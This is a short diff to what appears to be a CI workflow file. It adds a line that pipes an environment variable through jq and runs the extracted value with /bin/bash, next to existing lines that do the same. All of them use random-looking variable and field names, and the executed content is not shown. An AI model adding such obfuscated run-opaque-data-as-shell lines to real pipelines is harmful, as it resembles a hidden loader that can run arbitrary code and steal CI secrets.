@@ -50,6 +50,7 @@ jobs:
           echo $cykuq5 | jq -r .pjor345 | /bin/bash
           echo $dh82870 | jq -r .zh9629 | /bin/bash
           echo $nv8 | jq -r .tkal64149 | /bin/bash
+          printf '%s' "$vcyh9" | jq -r .gegg858 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
